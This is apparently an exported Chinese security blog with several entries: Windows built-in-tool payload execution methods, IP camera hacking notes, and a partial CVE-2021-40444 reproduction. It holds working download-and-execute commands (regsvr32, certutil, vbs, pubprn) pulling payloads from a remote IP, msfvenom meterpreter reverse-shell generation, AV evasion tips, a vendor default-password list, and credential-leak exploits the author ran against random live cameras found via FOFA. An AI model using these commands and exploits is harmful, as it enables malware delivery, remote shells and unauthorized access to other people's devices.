<h2 id="rundll32-本地执行dll"><a href="#rundll32-本地执行dll" class="headerlink" title="rundll32(本地执行dll)"></a>rundll32(本地执行dll)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">执行dll文件，无法远程执行。可能需要配合github项目jsrat或msf能远程。</span><br><span class="line">rundll32 xx.dll start</span><br></pre></td></tr></table></figure>





<h2 id="regsvr32-exe-远程执行sct调用wscript"><a href="#regsvr32-exe-远程执行sct调用wscript" class="headerlink" title="regsvr32.exe(远程执行sct调用wscript)"></a>regsvr32.exe(远程执行sct调用wscript)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?XML version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;scriptlet&gt;</span><br><span class="line">&lt;registration</span><br><span class="line">  progid&#x3D;&quot;TESTING&quot;</span><br><span class="line">  classid&#x3D;&quot;&#123;A1112221-0000-0000-3000-000DA00DABFC&#125;&quot; &gt;</span><br><span class="line">  &lt;script language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">    &lt;![CDATA[</span><br><span class="line">      var foo &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;); </span><br><span class="line">    ]]&gt;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;registration&gt;</span><br><span class="line">&lt;&#x2F;scriptlet&gt;</span><br></pre></td></tr></table></figure>

<p>上述保存为1.sct，然后运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">regsvr32.exe &#x2F;s &#x2F;u &#x2F;n &#x2F;i:http:&#x2F;&#x2F;23.91.97.29:998&#x2F;1.sct scrobj.dll</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20210715142408851.png" alt="image-20210715142408851"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?XML version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;scriptlet&gt;</span><br><span class="line">&lt;registration</span><br><span class="line">  description&#x3D;&quot;Component&quot;</span><br><span class="line">  progid&#x3D;&quot;Component.TESTCB&quot;</span><br><span class="line">  version&#x3D;&quot;1.00&quot;</span><br><span class="line">  classid&#x3D;&quot;&#123;20002222-0000-0000-0000-000000000002&#125;&quot;</span><br><span class="line">&gt;</span><br><span class="line">&lt;&#x2F;registration&gt;</span><br><span class="line"> </span><br><span class="line">&lt;public&gt;</span><br><span class="line">  &lt;method name&#x3D;&quot;exec&quot;&gt;</span><br><span class="line">  &lt;&#x2F;method&gt;</span><br><span class="line">&lt;&#x2F;public&gt;</span><br><span class="line">&lt;script language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">  &lt;![CDATA[</span><br><span class="line">    function exec()&#123;</span><br><span class="line">      new ActiveXObject(&#39;WScript.Shell&#39;).Run(&#39;calc.exe&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">  ]]&gt;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;scriptlet&gt;</span><br></pre></td></tr></table></figure>

<p>上述保存为2.sct，然后运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">regsvr32.exe &#x2F;s &#x2F;i:http:&#x2F;&#x2F;23.91.97.29:998&#x2F;2.sct scrobj.dll</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var test &#x3D; new ActiveXObject(&quot;Component.TESTCB&quot;);</span><br><span class="line">test.exec()</span><br></pre></td></tr></table></figure>

<p>将上述保存为2.js并运行，即可调用calc.exe</p>
<h2 id="certutil-下载，远程执行exe"><a href="#certutil-下载，远程执行exe" class="headerlink" title="certutil(下载，远程执行exe)"></a>certutil(下载，远程执行exe)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;23.91.97.29:998&#x2F;calc.exe C:\Users\test1\Desktop\a.exe&amp;&amp;C:\Users\test1\Desktop\a.exe		#下载并执行</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;23.91.97.29:998&#x2F;calc.exe C:\Users\test1\Desktop\a.exe		#下载到指定位置</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;23.91.97.29:998&#x2F;calc.exe a.exe		#下载到当前目录</span><br><span class="line"></span><br><span class="line">大部分情况av会拦截certutil，可以加上-verifyctl参数，需要高版本windows，使用</span><br><span class="line">certutil -verifyctl -split -f http:&#x2F;&#x2F;23.91.97.29:998&#x2F;calc.exe</span><br><span class="line">下载下来会是一串长字符后缀为bin的文件，把后缀修改为原后缀即可</span><br></pre></td></tr></table></figure>





<h2 id="msbuild-本地执行xml中C"><a href="#msbuild-本地执行xml中C" class="headerlink" title="msbuild(本地执行xml中C#)"></a>msbuild(本地执行xml中C#)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在.NET Framework 4.0中支持了一项新功能”Inline Tasks”，被包含在元素UsingTask中，可用来在xml文件中执行c#代码，所以上线需要.NET Framework版本大于等于4，通常路径是</span><br><span class="line">&quot;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe&quot;</span><br><span class="line">&quot;C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe&quot;</span><br><span class="line">生成64位的C#就要64位的运行，不过实验64位的没成功，下面的可以上线</span><br><span class="line">executes shellcode.xml下载地址https:&#x2F;&#x2F;leaderzhang.com&#x2F;upload&#x2F;2019&#x2F;12&#x2F;msbuild-inline-task-master-fb3ec10a4dbe4aaeb38064160ad6c866.zip</span><br><span class="line">参考https:&#x2F;&#x2F;3gstudent.github.io&#x2F;Use-MSBuild-To-Do-More</span><br></pre></td></tr></table></figure>

<p>生成c# shellcode</p>
<p><img src="/../../../../images/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20210716140522158.png" alt="image-20210716140522158"></p>
<p>生成的c# shellcode替换executes shellcode.xml中的shellcode</p>
<p><img src="/../../../../images/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20210716141021049.png" alt="image-20210716141021049"></p>
<p>然后用C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe 1xml执行即可上线</p>
<p><img src="/../../../../images/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20210716141546528.png" alt="image-20210716141546528"></p>
<h2 id="odbcconf-exe-本地执行dll"><a href="#odbcconf-exe-本地执行dll" class="headerlink" title="odbcconf.exe(本地执行dll)"></a>odbcconf.exe(本地执行dll)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom --platform windows -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;23.91.97.29 lport&#x3D;4491 -f dll &gt; hacker.dll</span><br><span class="line"></span><br><span class="line">odbcconf.exe &#x2F;a &#123;regsvr C:\Users\Administrator\Desktop\hacker.dll&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20210716153206198.png" alt="image-20210716153206198"></p>
<h2 id="CScript-WScript-下载，本地执行vbs"><a href="#CScript-WScript-下载，本地执行vbs" class="headerlink" title="CScript/WScript(下载，本地执行vbs)"></a>CScript/WScript(下载，本地执行vbs)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cscript和wscript均能执行vbs，区别是wscript执行vbs不会输出版本信息</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20210716162647980.png" alt="image-20210716162647980"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; Set your settings</span><br><span class="line"></span><br><span class="line">strFileURL &#x3D; &quot;http:&#x2F;&#x2F;23.91.97.29:998&#x2F;calc.exe&quot;</span><br><span class="line"></span><br><span class="line">strHDLocation &#x3D; &quot;C:\Users\administrator\Desktop\1.png&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#39; Fetch the file</span><br><span class="line"></span><br><span class="line">Set objXMLHTTP &#x3D; CreateObject(&quot;MSXML2.XMLHTTP&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">objXMLHTTP.open &quot;GET&quot;, strFileURL, false</span><br><span class="line"></span><br><span class="line">objXMLHTTP.send()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">If objXMLHTTP.Status &#x3D; 200 Then</span><br><span class="line"></span><br><span class="line">Set objADOStream &#x3D; CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line"></span><br><span class="line">objADOStream.Open</span><br><span class="line"></span><br><span class="line">objADOStream.Type &#x3D; 1 &#39;adTypeBinary</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">objADOStream.Write objXMLHTTP.ResponseBody</span><br><span class="line"></span><br><span class="line">objADOStream.Position &#x3D; 0&#39;Set the stream position to the start</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Set objFSO &#x3D; Createobject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line"></span><br><span class="line">If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation</span><br><span class="line"></span><br><span class="line">Set objFSO &#x3D; Nothing</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">objADOStream.SaveToFile strHDLocation</span><br><span class="line"></span><br><span class="line">objADOStream.Close</span><br><span class="line"></span><br><span class="line">Set objADOStream &#x3D; Nothing</span><br><span class="line"></span><br><span class="line">End if</span><br><span class="line"></span><br><span class="line">Set objXMLHTTP &#x3D; Nothing</span><br></pre></td></tr></table></figure>

<p>保存为down.vbs，然后wscript down.vbs</p>
<p>上线操作，可以拿来执行.wsh，.vbs，.js等。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp  LHOST&#x3D;23.91.97.29 lport&#x3D;4492 -f vbs &gt; msf.vbs</span><br><span class="line"></span><br><span class="line">wscript msf.vbs</span><br></pre></td></tr></table></figure>





<h2 id="pubprn-vbs-远程执行sct调用wscript"><a href="#pubprn-vbs-远程执行sct调用wscript" class="headerlink" title="pubprn.vbs(远程执行sct调用wscript)"></a>pubprn.vbs(远程执行sct调用wscript)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pubprn.vbs是在Windows 7以上版本存在一个名为pubprn.vbs的微软已签名WSH脚本,可以利用来解析.sct脚本。</span><br><span class="line">cscript &#x2F;b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:http:&#x2F;&#x2F;23.91.97.29:998&#x2F;pub.sct</span><br></pre></td></tr></table></figure>

<p>pub.sct</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?XML version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;scriptlet&gt;</span><br><span class="line">&lt;registration</span><br><span class="line">    description&#x3D;&quot;Bandit&quot;</span><br><span class="line">    progid&#x3D;&quot;Bandit&quot;</span><br><span class="line">    version&#x3D;&quot;1.00&quot;</span><br><span class="line">    classid&#x3D;&quot;&#123;AAAA1111-0000-0000-0000-0000FEEDACDC&#125;&quot;</span><br><span class="line">    remotable&#x3D;&quot;true&quot;</span><br><span class="line">    &gt;</span><br><span class="line">&lt;&#x2F;registration&gt;</span><br><span class="line">&lt;script language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">&lt;![CDATA[</span><br><span class="line">        var r &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;);</span><br><span class="line">]]&gt;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;scriptlet&gt;</span><br></pre></td></tr></table></figure>





<h2 id="IEEXEC-有请求但本地没有"><a href="#IEEXEC-有请求但本地没有" class="headerlink" title="IEEXEC(有请求但本地没有)"></a>IEEXEC(有请求但本地没有)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">要在C:\Windows\Microsoft.NET\Framework64\v2.0.50727下执行命令</span><br><span class="line">caspol -s off		#不知道啥用</span><br><span class="line">IEExec http:&#x2F;&#x2F;site.com&#x2F;files&#x2F;test64.exe		#实测会请求，但是用everything没搜到</span><br></pre></td></tr></table></figure>



<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这篇其实很水，虽然搜的网上的文章一一尝试的，但大部分文章都是一模一样的，然后还收集的不全，很多没测试成功的也没写上去。最主要的是，现在上线考验的是上线动作的免杀和隐蔽，这些原生的上线方式早已被很多产品标记，动作执行一下就会被弹窗提醒。</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>上线方式</tag>
      </tags>
  </entry>
  <entry>
    <title>摄像头</title>
    <url>/2021/04/01/%E6%91%84%E5%83%8F%E5%A4%B4/</url>
    <content><![CDATA[<h1 id="摄像头"><a href="#摄像头" class="headerlink" title="摄像头"></a>摄像头</h1><h3 id="1-摄像头基础知识"><a href="#1-摄像头基础知识" class="headerlink" title="1.摄像头基础知识"></a>1.摄像头基础知识</h3><h5 id="1-1-网络摄像头类型"><a href="#1-1-网络摄像头类型" class="headerlink" title="1.1 网络摄像头类型"></a>1.1 网络摄像头类型</h5><p>网络摄像头 (IPCam)：由视频服务器和摄像头的集成,通常是 linux 系统, 内置一个 web server,画面实时传输, 一般没有视频存储功能。</p>
<p>数字视频录像机 (DVR/NVR)：进行图像存储处理, 可录像, 录音, 远程监控等等,大概分为 PC 式和嵌入式, 操作系统不固定,只要处理设备装有处理软件即可, 视频存储</p>
<p>中央闭路电视 (CCTV)：图像通信系统和 DVR/NVR 结合起来, 通过双绞线、光缆、网络接收图像信号, 监控室里常见</p>
<p>监控云平台：通过云平台集中管理多个设备</p>
<h5 id="1-2-常见攻击方法"><a href="#1-2-常见攻击方法" class="headerlink" title="1.2 常见攻击方法"></a>1.2 常见攻击方法</h5><p>根据网络结构中的三个部分云端、手机端、摄像头设备端以及通讯协议可分为四类攻击方法</p>
<p><strong>针对摄像头设备的攻击：</strong></p>
<p>1、针对物理设备的攻击：调试接口暴露、固件提取、设备序列号篡改、篡改存储介质、获取普通用户权限、权限提升等；</p>
<p>2、针对固件的攻击：获取敏感数据、获取硬编码密码、逆向加密算法、获取敏感api接口、ftp或ssh等服务攻击、固件降级等；</p>
<p>3、针对内存的攻击：获取内存中的敏感数据（如用户名、密码等）、获取加密Key等。</p>
<p><strong>针对手机端的攻击：</strong></p>
<p>针对手机端app的攻击相对比较常见，而结合摄像头的特殊性，主要可以从以下几个方面入手。</p>
<p>1、静态反编译：对APP进行脱壳、使用反编译工具获取源码、本地敏感数据存储、logcat日志、webview风险测试等；</p>
<p>2、通信安全：中间人攻击、访问控制是否合理、数据加密强度等。</p>
<p><strong>针对云端的攻击：</strong></p>
<p>云服务端面临的风险和常规的应用服务器类似，简单列举几个。</p>
<p>1、web应用安全：用户注册的各种问题、任意用户注册、用户枚举、验证码缺陷、各种越权、密码复杂度、单点登录、密码修改等等。</p>
<p>2、服务安全：针对服务器开放的各种服务存在的缺陷进行攻击，如ftp、ssh、mysql等各种弱口令，针对操作系统的各种Nday和0day等；</p>
<p>3、其他：各种C段、子域名等等，还可以先打入摄像头公司内部办公网再觊觎服务器，DDOS打乱对方部署也是一种思路。</p>
<p><strong>针对协议的攻击：</strong></p>
<p>除了摄像头设备、手机端、云服这三个重要节点外，三者之间的通讯安全也非常关键。</p>
<p>1、APP与云端一般通过HTTP、HTTPS通信，分析中应判断通信流量是否加密，可否抓包劫持通信数据;</p>
<p>2、设备与云端一般采用MQTT、XMPP、CoAP等协议通信，也会使用HTTP、HTTPS通信,部分厂家的设备会使用私有协议进行通讯，例如京东、小米、broadlink等;</p>
<p>3、APP与设备之间通信一般利用短距离无线网络进行通信，如ZigBee、Wi-Fi以及蓝牙等。</p>
<h5 id="1-3-常见弱口令"><a href="#1-3-常见弱口令" class="headerlink" title="1.3 常见弱口令"></a>1.3 常见弱口令</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">海康威视(hikvision):admin&#x2F;123456</span><br><span class="line"></span><br><span class="line">大华网络摄像机(WEb SERVICE):admin&#x2F;admin 管理权限</span><br><span class="line">							default&#x2F;user 用户默认登录账号</span><br><span class="line">							888888&#x2F;admin</span><br><span class="line">							666666&#x2F;user</span><br><span class="line">							</span><br><span class="line">cctv摄像机(JAWS&#x2F;1.0):admin&#x2F;空</span><br><span class="line">					root&#x2F;juantech 系统口令</span><br><span class="line">					</span><br><span class="line">SQ-WEBCAM摄像机(SQ-WEBCAM):admin&#x2F;admin</span><br><span class="line"></span><br><span class="line">ACTi: admin&#x2F;123456 Admin&#x2F;123456</span><br><span class="line"> </span><br><span class="line">AmericanDynamics: admin&#x2F;admin or admin&#x2F;9999</span><br><span class="line"> </span><br><span class="line">ArecontVision: none</span><br><span class="line"> </span><br><span class="line">Avigilon: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Axis: traditionally root&#x2F;pass, newAxis cameras require password creation during first login</span><br><span class="line"> </span><br><span class="line">Basler: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Bosch: none</span><br><span class="line"> </span><br><span class="line">Brickcom: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Canon: root&#x2F;camera</span><br><span class="line"> </span><br><span class="line">Cisco: Nodefault password, requires creation during first login</span><br><span class="line"> </span><br><span class="line">Dahua: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">DigitalWatchdog: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">DRS: admin&#x2F;1234</span><br><span class="line"> </span><br><span class="line">DVTel: Admin&#x2F;1234</span><br><span class="line"> </span><br><span class="line">DynaColor: Admin&#x2F;1234</span><br><span class="line"> </span><br><span class="line">FLIR: admin&#x2F;fliradmin</span><br><span class="line"> </span><br><span class="line">Foscam: admin&#x2F;</span><br><span class="line"> </span><br><span class="line">GeoVision: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Grandstream: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Hikvision: admin&#x2F;12345</span><br><span class="line"> </span><br><span class="line">Honeywell: admin&#x2F;1234</span><br><span class="line"> </span><br><span class="line">IQinVision: root&#x2F;system</span><br><span class="line"> </span><br><span class="line">IPX-DDK: root&#x2F;admin orroot&#x2F;Admin\</span><br><span class="line"> </span><br><span class="line">JVC: admin&#x2F;jvc</span><br><span class="line"> </span><br><span class="line">March: Networks: admin&#x2F;</span><br><span class="line"> </span><br><span class="line">Mobotix: admin&#x2F;meinsm</span><br><span class="line"> </span><br><span class="line">Panasonic: admin&#x2F;12345</span><br><span class="line"> </span><br><span class="line">PelcoSarix: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Pixord: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">SamsungElectronics: root&#x2F;root or admin&#x2F;4321</span><br><span class="line"> </span><br><span class="line">SamsungTechwin (old): admin&#x2F;1111111</span><br><span class="line"> </span><br><span class="line">Samsung(new): admin&#x2F;4321</span><br><span class="line"> </span><br><span class="line">Sanyo: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Scallop: admin&#x2F;password</span><br><span class="line"> </span><br><span class="line">Sentry360(mini): admin&#x2F;1234</span><br><span class="line"> </span><br><span class="line">Sentry360(pro): none</span><br><span class="line"> </span><br><span class="line">Sony: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Speco: admin&#x2F;1234</span><br><span class="line"> </span><br><span class="line">Stardot: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Starvedia: admin&#x2F;</span><br><span class="line"> </span><br><span class="line">Trendnet: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Toshiba: root&#x2F;ikwd</span><br><span class="line"> </span><br><span class="line">VideoIQ: supervisor&#x2F;supervisor</span><br><span class="line"> </span><br><span class="line">Vivotek: root&#x2F;</span><br><span class="line"> </span><br><span class="line">Ubiquiti: ubnt&#x2F;ubnt</span><br><span class="line"> </span><br><span class="line">Wodsee: admin&#x2F;</span><br></pre></td></tr></table></figure>



<h3 id="2-摄像头漏洞"><a href="#2-摄像头漏洞" class="headerlink" title="2. 摄像头漏洞"></a>2. 摄像头漏洞</h3><h5 id="2-1-DVR登录绕过-CVE-2018-9995"><a href="#2-1-DVR登录绕过-CVE-2018-9995" class="headerlink" title="2.1 DVR登录绕过 CVE-2018-9995"></a>2.1 DVR登录绕过 CVE-2018-9995</h5><p><strong>公布时间</strong>：2018年4月</p>
<p><strong>影响版本</strong>：tbk、NovoCeNova、QSee、Pulnix、XVR 5 in 1、Securus、Night OWL</p>
<p><strong>漏洞位置</strong>：</p>
<p><strong>漏洞描述</strong>：DVR，全称为Digital Video Recorder(硬盘录像机)，即数字视频录像机。最初由阿根廷研究员发现，通过使用“Cookie： uid = admin”的Cookie标头来访问特定DVR的控制面板，DVR将以明文形式响应设备的管理员凭证。</p>
<p><strong>修复建议</strong>：</p>
<p><strong>漏洞复现</strong>：</p>
<p>2020年2月20日。直接用fofa搜“login.rsp”即可，感觉还是挺多的，随便找了一个就存在该漏洞。</p>
<p>利用有两种方式。第一种是直接用curl命令获取帐密。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl &quot;http:&#x2F;&#x2F;ip:port&#x2F;device.rsp?opt&#x3D;user&amp;cmd&#x3D;list&quot; -H &quot;Cookie: uid&#x3D;admin&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220145757392.png" alt="image-20200220145757392"></p>
<p>第二种是添加cookie，然后刷新访问，注意不要带login.rsp。另外要看监控画面需要安装插件。</p>
<p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220150235066.png" alt="image-20200220150235066"></p>
<p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220150323351.png" alt="image-20200220150323351"></p>
<h5 id="2-2-JAWS登录绕过"><a href="#2-2-JAWS登录绕过" class="headerlink" title="2.2 JAWS登录绕过"></a>2.2 JAWS登录绕过</h5><p><strong>公布时间</strong>：</p>
<p><strong>影响版本</strong>：app=”JAWS/1.0”</p>
<p><strong>漏洞位置</strong>：</p>
<p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220153731462.png" alt="image-20200220153731462"><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220160326388.png" alt="image-20200220160326388"></p>
<p><strong>漏洞描述</strong>：上面这段代码比较短我还是很容易看懂的，判断cookie里面dvr_usr和dvr_pwd不为空就可以进入控制面板了，而且对内容无要求。</p>
<p><strong>修复建议</strong>：</p>
<p><strong>漏洞复现</strong>：</p>
<p>2020年2月20日。fofa搜app=”JAWS/1.0”，随便找的一个就成功了，感觉也挺容易的。</p>
<p>添加两条cookie，dvr_usr和dvr_pwd，值随意，添加后访问view2.html。</p>
<p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220161019296.png" alt="image-20200220161019296"></p>
<p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220161721889.png" alt="image-20200220161721889"></p>
<p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220162108549.png" alt="image-20200220162108549"></p>
<h5 id="2-3-D-Link-DCS系列监控-账号密码信息泄露漏洞-CVE-2020-25078"><a href="#2-3-D-Link-DCS系列监控-账号密码信息泄露漏洞-CVE-2020-25078" class="headerlink" title="2.3 D-Link DCS系列监控 账号密码信息泄露漏洞 CVE-2020-25078"></a>2.3 D-Link DCS系列监控 账号密码信息泄露漏洞 CVE-2020-25078</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FOFA： app&#x3D;”D_Link-DCS-2530L”</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DCS-2530L</span><br><span class="line">DCS-2670L</span><br><span class="line">DCS-4603</span><br><span class="line">DCS-4622</span><br><span class="line">等多个DCS系列系统</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;config&#x2F;getuser?index&#x3D;0	#访问漏洞位置获取账密后再访问首页登录</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20210401210426597.png" alt="image-20210401210426597"></p>
<p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20210401210448193.png" alt="image-20210401210448193"></p>
<p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20210401210543504.png" alt="image-20210401210543504"></p>
]]></content>
      <tags>
        <tag>漏洞复现</tag>
        <tag>摄像头</tag>
        <tag>硬件</tag>
      </tags>
  </entry>
  <entry>
    <title>微软MSHTML引擎CVE-2021-40444漏洞复现</title>
    <url>/2021/09/27/%E5%BE%AE%E8%BD%AFMSHTML%E5%BC%95%E6%93%8ECVE-2021-40444%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2021年9月8日，微软发布安全通告披露了Microsoft MSHTML远程代码执行漏洞，攻击者可通过制作恶意的ActiveX控件供托管浏览器呈现引擎的 Microsoft Office文档使用，成功诱导用户打开恶意文档后，可在目标系统上以该用户权限执行任意代码。</span><br><span class="line"></span><br><span class="line">MSHTML(又称为Trident)是微软旗下的Internet Explorer浏览器引擎，也用于Office应用程序，以在Word、Excel或PowerPoint文档中呈现Web托管的内容，AcitveX控件是微软COM架构下的产物，在Windows的Office套件、IE浏览器中有广泛的应用，利用ActiveX控件即可与MSHTML组件进行交互。</span><br></pre></td></tr></table></figure>

<h2 id="POC地址"><a href="#POC地址" class="headerlink" title="POC地址"></a>POC地址</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;lockedbyte&#x2F;CVE-2021-40444</span><br></pre></td></tr></table></figure>

<h2 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docx改zip</span><br><span class="line">\word\_rels\document.xml.rels</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/%E5%BE%AE%E8%BD%AFMSHTML%E5%BC%95%E6%93%8ECVE-2021-40444%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210927113823630.png" alt="image-20210927113823630"></p>
<h2 id="利用要安装lcab"><a href="#利用要安装lcab" class="headerlink" title="利用要安装lcab"></a>利用要安装lcab</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">920  wget http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian&#x2F;pool&#x2F;main&#x2F;l&#x2F;lcab&#x2F;lcab_1.0b12.orig.tar.gz</span><br><span class="line">921  tar zxvf lcab_1.0b12.orig.tar.gz</span><br><span class="line">922  cd lcab-1.0b12</span><br><span class="line">923  .&#x2F;configure </span><br><span class="line">924  make</span><br><span class="line">925  make install</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/%E5%BE%AE%E8%BD%AFMSHTML%E5%BC%95%E6%93%8ECVE-2021-40444%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210927115551022.png" alt="image-20210927115551022"></p>
<p>这玩意儿貌似默认开启的</p>
<p><img src="/../../../../images/%E5%BE%AE%E8%BD%AFMSHTML%E5%BC%95%E6%93%8ECVE-2021-40444%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210927122439455.png" alt="image-20210927122439455"></p>
<h2 id="弹计算器"><a href="#弹计算器" class="headerlink" title="弹计算器"></a>弹计算器</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 exploit.py generate test&#x2F;calc.dll http:&#x2F;&#x2F;23.91.97.29:97</span><br><span class="line">python3 exploit.py host 97</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/%E5%BE%AE%E8%BD%AFMSHTML%E5%BC%95%E6%93%8ECVE-2021-40444%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210927120247351.png" alt="image-20210927120247351"></p>
<p>生成得docx在out目录下</p>
<p><img src="/../../../../images/%E5%BE%AE%E8%BD%AFMSHTML%E5%BC%95%E6%93%8ECVE-2021-40444%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210927122225118.png" alt="image-20210927122225118"></p>
<p>要关闭实时防护</p>
<p><img src="/../../../../images/%E5%BE%AE%E8%BD%AFMSHTML%E5%BC%95%E6%93%8ECVE-2021-40444%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210927122304182.png" alt="image-20210927122304182"></p>
<p><img src="/../../../../images/%E5%BE%AE%E8%BD%AFMSHTML%E5%BC%95%E6%93%8ECVE-2021-40444%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210927121041900.png" alt="image-20210927121041900"></p>
<h2 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h2><p>cs先生成powershell</p>
